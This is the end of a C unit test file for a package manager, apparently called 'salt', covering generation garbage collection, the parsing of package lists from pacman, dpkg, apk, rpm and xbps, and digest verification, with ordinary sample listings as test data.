  salt_gc_report_free(&rep);

  int64_t pin = t1;
  salt_gc_opts real = {.keep = 1, .pinned = &pin, .npinned = 1, .dry_run = false};
  salt_gc_report_init(&rep);
  CHECK(salt_gc_run(&ctx, db, &real, &rep) == SALT_OK, "gc run");
  CHECK(rep.generations_removed > 0, "gc pruned generations");
  salt_deployment_list_init(&deps);
  salt_db_deployments(db, &deps);
  bool newest_kept = false, pinned_kept = false;
  for (size_t i = 0; i < deps.len; i++) {
    if (deps.items[i].id == t1 && strcmp(deps.items[i].status, "ok") == 0) pinned_kept = true;
    if (i == 0 && strcmp(deps.items[i].status, "ok") == 0) newest_kept = true;
  }
  CHECK(newest_kept, "gc keeps the current generation");
  CHECK(pinned_kept, "gc keeps the pinned generation");
  salt_buf sd;
  salt_buf_init(&sd);
  salt_buf_printf(&sd, "%s/txn-%lld", ctx.state_dir, (long long)t2);
  CHECK(!salt_path_exists(sd.data), "gc removed the pruned generation's state");
  salt_buf_free(&sd);
  salt_deployment_list_free(&deps);
  salt_gc_report_free(&rep);
  CHECK(salt_path_exists(bin) && salt_db_is_installed(db, "tool"), "gc left the live system alone");

  salt_db_close(db);
  salt_ctx_free(&ctx);
  salt_archive_free(&one);
  salt_archive_free(&two);
  salt_archive_free(&three);
  salt_pkg_meta_free(&m);
  free(onep);
  free(twop);
  free(threep);
  free(bin);
  free(blocker);
  free(staging);
  free(deep);
  free(root);
  salt_remove_recursive(d);
}

static void test_foreign_pkg(void) {
  salt_foreign_pkg_list l;
  salt_foreign_pkg_list_init(&l);
  const char *pac = "zlib 1:1.3.1-2\nbash 5.2.037-1\n";
  CHECK(salt_foreign_pkg_parse("pacman", pac, strlen(pac), &l) == SALT_OK, "pacman -Q parse");
  CHECK(l.len == 2 && strcmp(l.items[0].name, "bash") == 0, "pacman sorted by name");
  const salt_foreign_pkg *z = salt_foreign_pkg_list_find(&l, "zlib");
  CHECK(z && strcmp(z->version, "1:1.3.1-2") == 0, "pacman epoch version kept");
  salt_foreign_pkg_list_free(&l);

  const char *dpkg =
      "installed\tbash\t5.2.21-2ubuntu4\nconfig-files\told\t1.0\n"
      "installed\tlibc6\t2.39-0ubuntu8.4\n";
  CHECK(salt_foreign_pkg_parse("apt", dpkg, strlen(dpkg), &l) == SALT_OK, "dpkg-query parse");
  CHECK(l.len == 2 && !salt_foreign_pkg_list_find(&l, "old"), "dpkg config-files skipped");
  z = salt_foreign_pkg_list_find(&l, "libc6");
  CHECK(z && strcmp(z->version, "2.39-0ubuntu8.4") == 0, "dpkg version");
  salt_foreign_pkg_list_free(&l);

  const char *apk =
      "WARNING: opening from cache\nmusl-1.2.5-r0\nca-certificates-bundle-20240705-r0\n";
  CHECK(salt_foreign_pkg_parse("apk", apk, strlen(apk), &l) == SALT_OK, "apk info parse");
  z = salt_foreign_pkg_list_find(&l, "ca-certificates-bundle");
  CHECK(l.len == 2 && z && strcmp(z->version, "20240705-r0") == 0, "apk dashed name split");
  salt_foreign_pkg_list_free(&l);
  const char *apk_bad = "nodash\n";
  CHECK(salt_foreign_pkg_parse("apk", apk_bad, strlen(apk_bad), &l) != SALT_OK,
        "apk malformed line rejected");
  salt_foreign_pkg_list_free(&l);

  const char *rpm = "gpg-pubkey\t18b8e74c-62f2920f\nbash\t5.2.26-3.fc40\nglibc\t2.39-33.fc40\n";
  CHECK(salt_foreign_pkg_parse("dnf", rpm, strlen(rpm), &l) == SALT_OK, "rpm -qa parse");
  CHECK(l.len == 2 && !salt_foreign_pkg_list_find(&l, "gpg-pubkey"), "rpm gpg-pubkey skipped");
  salt_foreign_pkg_list_free(&l);

  const char *xbps =
      "ii base-files-0.143_3          Void Linux base\n"
      "uu old-1.0_1  unpacked\nii zlib-1.3.1_1  zlib\n";
  CHECK(salt_foreign_pkg_parse("xbps", xbps, strlen(xbps), &l) == SALT_OK, "xbps-query -l parse");
  z = salt_foreign_pkg_list_find(&l, "base-files");
  CHECK(l.len == 2 && z && strcmp(z->version, "0.143_3") == 0, "xbps pkgver split");
  salt_foreign_pkg_list_free(&l);

  CHECK(salt_foreign_pkg_parse("brew", "x 1\n", 4, &l) != SALT_OK, "unknown manager rejected");
  salt_foreign_pkg_list_free(&l);

  salt_buf spec;
  salt_buf_init(&spec);
  CHECK(salt_foreign_pkg_spec("apt", "bash", "5.2.21-2ubuntu4", &spec) == SALT_OK &&
            strcmp(spec.data, "bash=5.2.21-2ubuntu4") == 0,
        "apt exact spec");
  salt_buf_free(&spec);
  salt_buf_init(&spec);
  CHECK(salt_foreign_pkg_spec("dnf", "bash", "5.2.26-3.fc40", &spec) == SALT_OK &&
            strcmp(spec.data, "bash-5.2.26-3.fc40") == 0,
        "dnf exact spec");
  salt_buf_free(&spec);
  salt_buf_init(&spec);
  CHECK(salt_foreign_pkg_spec("xbps", "zlib", "1.3.1_1", &spec) == SALT_OK &&
            strcmp(spec.data, "zlib-1.3.1_1") == 0,
        "xbps exact spec");
  salt_buf_free(&spec);
  salt_buf_init(&spec);
  CHECK(salt_foreign_pkg_spec("pacman", "zlib", "1.3.1-2", &spec) != SALT_OK,
        "pacman has no versioned repo spec");
  CHECK(salt_foreign_pkg_spec("apk", "zlib", "", &spec) != SALT_OK, "empty version rejected");
  salt_buf_free(&spec);

  salt_stratum st;
  memset(&st, 0, sizeof(st));
  st.family = "ubuntu";
  CHECK(strcmp(salt_stratum_pkg_kind(&st), "apt") == 0, "kind from family");
  st.package_manager = "xbps";
  CHECK(strcmp(salt_stratum_pkg_kind(&st), "xbps") == 0, "kind prefers package_manager");
  st.package_manager = "nix";
  st.family = "nixos";
  CHECK(salt_stratum_pkg_kind(&st) == NULL, "unknown kind is NULL");
}

static void test_foreign_digests(void) {
  static const char hex[] = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
  salt_foreign_pkg_list l;
  salt_foreign_pkg_list_init(&l);
  const salt_foreign_pkg *z;

  const char *rpm = "bash\t5.2.26-3.fc40\nglibc\t2.39-33.fc40\n";
  CHECK(salt_foreign_pkg_parse("dnf", rpm, strlen(rpm), &l) == SALT_OK, "rpm list for digests");
  char rpmd[512];
  snprintf(rpmd, sizeof(rpmd),
           "gpg-pubkey\t18b8e74c-62f2920f\t(none)\nbash\t5.2.26-3.fc40\t%s\n"
           "glibc\t2.39-33.fc40\t%s\n",
           hex, hex);
  CHECK(salt_foreign_pkg_parse_digests("dnf", rpmd, strlen(rpmd), &l) == SALT_OK,
        "rpm SHA256HEADER digests attached");
  z = salt_foreign_pkg_list_find(&l, "bash");
  CHECK(z && z->digest && strncmp(z->digest, "rpm-sha256header:", 17) == 0 &&
            strcmp(z->digest + 17, hex) == 0,
        "rpm digest prefixed");
  salt_foreign_pkg_list_free(&l);

  CHECK(salt_foreign_pkg_parse("dnf", rpm, strlen(rpm), &l) == SALT_OK, "rpm list again");
  const char *rpm_none = "bash\t5.2.26-3.fc40\t(none)\nglibc\t2.39-33.fc40\t(none)\n";
  CHECK(salt_foreign_pkg_parse_digests("dnf", rpm_none, strlen(rpm_none), &l) != SALT_OK,
        "rpm without SHA256HEADER refused");
  salt_foreign_pkg_list_free(&l);

  CHECK(salt_foreign_pkg_parse("dnf", rpm, strlen(rpm), &l) == SALT_OK, "rpm list again");
  snprintf(rpmd, sizeof(rpmd), "bash\t5.2.26-3.fc40\t%s\n", hex);
  CHECK(salt_foreign_pkg_parse_digests("dnf", rpmd, strlen(rpmd), &l) != SALT_OK,
        "rpm missing digest for an installed package refused");
  salt_foreign_pkg_list_free(&l);

  const char *apk = "musl-1.2.5-r0\nzlib-1.3.1-r1\n";
  CHECK(salt_foreign_pkg_parse("apk", apk, strlen(apk), &l) == SALT_OK, "apk list for digests");
  const char *apkdb =
      "C:Q1abcdef=\nP:musl\nV:1.2.5-r0\nA:x86_64\n\n"
      "C:Q1zzz=\nP:zlib\nV:1.3.1-r1\n\n";
  CHECK(salt_foreign_pkg_parse_digests("apk", apkdb, strlen(apkdb), &l) == SALT_OK,
        "apk installed db checksums attached");
  z = salt_foreign_pkg_list_find(&l, "zlib");
  CHECK(z && z->digest && strcmp(z->digest, "apk-checksum:Q1zzz=") == 0, "apk checksum prefixed");
  salt_foreign_pkg_list_free(&l);

  CHECK(salt_foreign_pkg_parse("apk", apk, strlen(apk), &l) == SALT_OK, "apk list again");
  const char *apkdb_old = "C:Q1abcdef=\nP:musl\nV:1.2.4-r0\n\nC:Q1zzz=\nP:zlib\nV:1.3.1-r1\n";
  CHECK(salt_foreign_pkg_parse_digests("apk", apkdb_old, strlen(apkdb_old), &l) != SALT_OK,
        "apk db version mismatch leaves package undigested");
  salt_foreign_pkg_list_free(&l);

  const char *xbps = "ii zlib-1.3.1_1  zlib\nii base-files-0.143_3  base\n";
  CHECK(salt_foreign_pkg_parse("xbps", xbps, strlen(xbps), &l) == SALT_OK, "xbps list for digests");
  char xd[512];
  snprintf(xd, sizeof(xd), "zlib-1.3.1_1\t%s\nbase-files-0.143_3\t%s\n", hex, hex);
  CHECK(salt_foreign_pkg_parse_digests("xbps", xd, strlen(xd), &l) == SALT_OK,
        "xbps filename-sha256 attached");
  z = salt_foreign_pkg_list_find(&l, "base-files");
  CHECK(z && z->digest && strncmp(z->digest, "sha256:", 7) == 0 && strcmp(z->digest + 7, hex) == 0,
        "xbps digest prefixed");
  salt_foreign_pkg_list_free(&l);

  CHECK(salt_foreign_pkg_parse("xbps", xbps, strlen(xbps), &l) == SALT_OK, "xbps list again");
  snprintf(xd, sizeof(xd), "zlib-1.3.1_1\t%s\nbase-files-0.143_3\t\n", hex);
  CHECK(salt_foreign_pkg_parse_digests("xbps", xd, strlen(xd), &l) != SALT_OK,
        "xbps empty sha256 refused");
  salt_foreign_pkg_list_free(&l);

  CHECK(salt_foreign_pkg_parse_digests("pacman", "", 0, &l) != SALT_OK,
        "pacman digests are not text-parsed");
  salt_foreign_pkg_list_free(&l);
}

int main(void) {
  test_buf();
  test_strlist();
  test_sha256();
  test_sign();
  test_zst();
  test_toml();
  test_pkg_roundtrip();
  test_tar();
  test_tar_confinement();
  test_archive_db();
  test_repo();
  test_trust();
  test_repo_verify();
  test_db_deps_conflicts();
  test_txn_rollback();
  test_foreign_pkg();
  test_foreign_digests();
  printf("\n%d/%d checks passed\n", g_total - g_fail, g_total);
  return g_fail ? 1 : 0;
}
